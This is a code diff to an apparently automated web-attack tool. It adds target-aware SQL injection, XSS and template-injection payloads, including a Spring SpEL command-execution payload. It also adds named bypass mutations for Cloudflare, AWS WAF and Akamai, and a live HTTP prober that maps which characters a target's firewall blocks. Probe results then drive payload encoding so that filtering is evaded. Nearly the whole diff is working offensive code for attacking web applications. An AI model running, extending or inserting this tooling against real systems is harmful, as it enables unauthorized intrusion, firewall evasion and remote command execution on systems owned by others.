@@ -8,6 +8,7 @@ import hashlib
 import json
 import random
 import urllib.parse
+import httpx
 from typing import Any, Callable, Dict, List, Optional
 
 from ai_osop.adapters.payload_mcp import PayloadMCPAdapter
@@ -149,6 +150,99 @@ class PayloadTemplateLibrary:
             all_templates.extend(ctx_templates)
         return all_templates
 
+    @classmethod
+    def get_context_aware_templates(
+        cls,
+        vuln_type: VulnClass,
+        *,
+        dbms: Optional[str] = None,
+        waf: Optional[str] = None,
+        framework: Optional[str] = None,
+        context: Optional[str] = None,
+    ) -> List[str]:
+        """Get payloads adapted to the target's DBMS, WAF, and framework.
+
+        Context-aware payload generation (Priority 8 of the roadmap): a human
+        researcher doesn't send MySQL payloads against PostgreSQL, or
+        un-obfuscated payloads against Cloudflare. This method selects +
+        mutates payloads based on what we know about the target.
+
+        Args:
+            dbms: detected database ('mysql', 'postgresql', 'mssql', 'sqlite', 'oracle')
+            waf: detected WAF ('cloudflare', 'aws_waf', 'akamai', 'f5_bigip', 'sucuri', 'imperva')
+            framework: detected framework ('django', 'flask', 'spring', 'express', 'rails', 'aspnet')
+            context: injection context ('error_based', 'union_based', 'time_based', 'html_body', etc.)
+
+        Returns:
+            List of payloads adapted to the target's technology stack.
+        """
+        base = cls.get_templates(vuln_type, context)
+        if not base:
+            return []
+
+        adapted: List[str] = []
+
+        for payload in base:
+            p = payload
+
+            # DBMS-specific adaptation for SQLi
+            if vuln_type == VulnClass.SQLI:
+                if dbms == "postgresql":
+                    # Replace MySQL-specific syntax with PostgreSQL equivalents
+                    p = p.replace("SLEEP(5)", "pg_sleep(5)")
+                    p = p.replace("WAITFOR DELAY '0:0:5'--", "pg_sleep(5)--")
+                    p = p.replace("@@version", "version()")
+                    p = p.replace("CONVERT(int,", "::text")
+                elif dbms == "mssql":
+                    p = p.replace("pg_sleep(5)", "WAITFOR DELAY '0:0:5'--")
+                    p = p.replace("SLEEP(5)", "WAITFOR DELAY '0:0:5'--")
+                elif dbms == "sqlite":
+                    p = p.replace("SLEEP(5)", "randomblob(100000000)")
+                    p = p.replace("pg_sleep(5)", "randomblob(100000000)")
+                    p = p.replace("WAITFOR DELAY '0:0:5'--", "randomblob(100000000)")
+                elif dbms == "oracle":
+                    p = p.replace("SLEEP(5)", "DBMS_LOCK.SLEEP(5)")
+                    p = p.replace("@@version", "banner FROM v$version")
+
+            # WAF bypass: apply encoding mutations for known WAFs
+            if waf == "cloudflare":
+                # Cloudflare blocks common SQLi patterns; use mixed-case + comments
+                if vuln_type == VulnClass.SQLI:
+                    p = p.replace("UNION", "UnIoN")
+                    p = p.replace("SELECT", "SeLeCt")
+                    p = p.replace("' OR", "' /*!OR*/")
+                # XSS: use SVG + data URIs instead of <script>
+                elif vuln_type == VulnClass.XSS:
+                    if "<script>" in p:
+                        p = p.replace("<script>alert(1)</script>",
+                                      "<svg/onload=alert(1)>")
+            elif waf == "aws_waf":
+                # AWS WAF: try case variation + inline comments
+                if vuln_type == VulnClass.SQLI:
+                    p = p.replace("OR", "oR")
+                    p = p.replace("AND", "aNd")
+            elif waf == "akamai":
+                # Akamai: use HTML entity encoding for XSS
+                if vuln_type == VulnClass.XSS:
+                    p = "".join(f"&#{ord(c)};" if c in "<>\"'" else c for c in p)
+
+            # Framework-specific adaptation
+            if framework == "django":
+                # Django's template engine uses {% %} and {{ }}
+                if vuln_type == VulnClass.SSTI:
+                    p = "{% debug %}"
+            elif framework == "flask":
+                if vuln_type == VulnClass.SSTI:
+                    p = "{{ config.SECRET_KEY }}"
+            elif framework == "spring":
+                # Spring: SpEL injection
+                if vuln_type == VulnClass.SSTI:
+                    p = "#{T(java.lang.Runtime).getRuntime().exec('id')}"
+
+            adapted.append(p)
+
+        return adapted
+
 
 class EncodingPipeline:
     """Multi-stage encoding pipeline for payload obfuscation."""
@@ -268,6 +362,89 @@ class PayloadFitnessEvaluator:
         return 0.1
 
 
+class WAFCharacterProber:
+    """Probes individual characters against a target parameter/URL to detect filtering or WAF blocks."""
+
+    def __init__(self, client: Optional[httpx.AsyncClient] = None):
+        self.client = client
+
+    async def probe_characters(
+        self,
+        url: str,
+        param_name: str,
+        method: str = "GET",
+        headers: Optional[Dict[str, str]] = None,
+        characters: Optional[List[str]] = None,
+    ) -> Dict[str, str]:
+        """Probe each character and return a map of character -> status."""
+        if characters is None:
+            characters = ["'", "\"", "<", ">", "/", ";", "(", ")", "[", "]", "{", "}", "--", "#", "`", "$"]
+
+        char_map = {}
+        client = self.client or httpx.AsyncClient(verify=False)
+        close_client = self.client is None
+
+        try:
+            # Establish baseline request (benign value)
+            baseline_val = "baseline123"
+            try:
+                if method.upper() == "GET":
+                    baseline_resp = await client.request(
+                        method,
+                        url,
+                        params={param_name: baseline_val},
+                        headers=headers,
+                        timeout=5.0
+                    )
+                else:
+                    baseline_resp = await client.request(
+                        method,
+                        url,
+                        data={param_name: baseline_val},
+                        headers=headers,
+                        timeout=5.0
+                    )
+                baseline_status = baseline_resp.status_code
+            except Exception:
+                return {c: "allowed" for c in characters}
+
+            # Probe each character
+            for char in characters:
+                try:
+                    payload_val = f"test{char}value"
+                    if method.upper() == "GET":
+                        resp = await client.request(
+                            method,
+                            url,
+                            params={param_name: payload_val},
+                            headers=headers,
+                            timeout=5.0
+                        )
+                    else:
+                        resp = await client.request(
+                            method,
+                            url,
+                            data={param_name: payload_val},
+                            headers=headers,
+                            timeout=5.0
+                        )
+
+                    if resp.status_code in (403, 406, 418, 429) or (resp.status_code != baseline_status and resp.status_code >= 400):
+                        char_map[char] = "blocked"
+                    elif char not in resp.text and char in payload_val:
+                        char_map[char] = "filtered"
+                    else:
+                        char_map[char] = "allowed"
+                except Exception:
+                    char_map[char] = "blocked"
+
+        finally:
+            if close_client:
+                await client.aclose()
+
+        return char_map
+
+
 class AdaptivePayloadEngine:
     """
     Core payload intelligence engine.
@@ -280,7 +457,10 @@ class AdaptivePayloadEngine:
     """
 
     def __init__(
-        self, mcp_adapter: Optional[PayloadMCPAdapter] = None, llm_client: Optional[Any] = None
+        self,
+        mcp_adapter: Optional[PayloadMCPAdapter] = None,
+        llm_client: Optional[Any] = None,
+        client: Optional[Any] = None,
     ):
         self.mcp = mcp_adapter
         self.llm_client = llm_client
@@ -288,9 +468,24 @@ class AdaptivePayloadEngine:
         self.encoding_pipeline = EncodingPipeline()
         self.waf_strategies = WAFBypassStrategies()
         self.fitness_evaluator = PayloadFitnessEvaluator()
+        self.prober = WAFCharacterProber(client)
 
         self._waf_profiles: Dict[str, Dict[str, Any]] = {}
         self._population_history: Dict[str, List[Payload]] = {}
+        self._character_maps: Dict[str, Dict[str, str]] = {}
+
+    async def probe_target_characters(
+        self,
+        target_hash: str,
+        url: str,
+        param_name: str,
+        method: str = "GET",
+        headers: Optional[Dict[str, str]] = None,
+    ) -> Dict[str, str]:
+        """Probe characters for a target and cache the results."""
+        char_map = await self.prober.probe_characters(url, param_name, method, headers)
+        self._character_maps[target_hash] = char_map
+        return char_map
 
     def get_payloads(self, vuln_type: VulnClass) -> List[str]:
         """Get list of payload strings for the specified vulnerability class."""
@@ -492,21 +687,51 @@ class AdaptivePayloadEngine:
     async def _mutate(
         self, payload: Payload, vuln_type: VulnClass, context: Dict[str, Any]
     ) -> Payload:
-        """Apply random mutation to payload."""
-        mutations = [
-            lambda p: self.encoding_pipeline.apply(p, [random.choice(["url", "hex", "null_byte"])]),
-            lambda p: p.replace(" ", random.choice(["/**/", "%0a", "%09"])),
-            lambda p: p.replace("SELECT", "SeLeCt") if "SELECT" in p else p,
-            lambda p: p + random.choice(["--", "#", ";%00"]),
-        ]
+        """Apply random mutation to payload, respecting target character controls."""
+        target_hash = context.get("target_hash") or context.get("target") or ""
+        char_map = self._character_maps.get(target_hash, {})
 
-        mutated_content = random.choice(mutations)(payload.content)
+        # Heuristic mutation based on character map
+        mutations = []
+        
+        # 1. Base mutations
+        mutations.append(lambda p: p.replace(" ", random.choice(["/**/", "%0a", "%09"])))
+        
+        if vuln_type == VulnClass.SQLI:
+            mutations.append(lambda p: p.replace("SELECT", "SeLeCt") if "SELECT" in p else p)
+            
+        # Add comment termination if allowed
+        comment_char = "#" if char_map.get("#") == "allowed" else "--"
+        mutations.append(lambda p: p + random.choice([comment_char, ";%00"]))
+
+        # If quotes are blocked, we must apply encoding variations (WAF character probe integration)
+        blocked_chars = [c for c, status in char_map.items() if status == "blocked"]
+        
+        # Generate mutated content
+        chosen_mutator = random.choice(mutations)
+        mutated_content = chosen_mutator(payload.content)
+        
+        encoding_chain = list(payload.encoding_chain or [])
+        # If any of the characters in the mutated content are blocked, force an encoding variation
+        if any(c in mutated_content for c in blocked_chars):
+            # Apply an encoding that bypasses character filtering
+            best_encoding = random.choice(["url", "hex", "unicode"])
+            if best_encoding not in encoding_chain:
+                encoding_chain.append(best_encoding)
+                mutated_content = self.encoding_pipeline.apply(mutated_content, [best_encoding])
+        else:
+            # Standard encoding variation
+            if random.random() < 0.3:
+                extra_mutations = [
+                    lambda p: self.encoding_pipeline.apply(p, [random.choice(["url", "hex", "null_byte"])])
+                ]
+                mutated_content = random.choice(extra_mutations)(mutated_content)
 
         return Payload(
             vuln_type=payload.vuln_type,
             content=mutated_content,
             content_hash=hashlib.sha256(mutated_content.encode()).hexdigest()[:16],
-            encoding_chain=payload.encoding_chain,
+            encoding_chain=encoding_chain,
             context=payload.context,
             generation=payload.generation + 1,
             parent_id=payload.id,
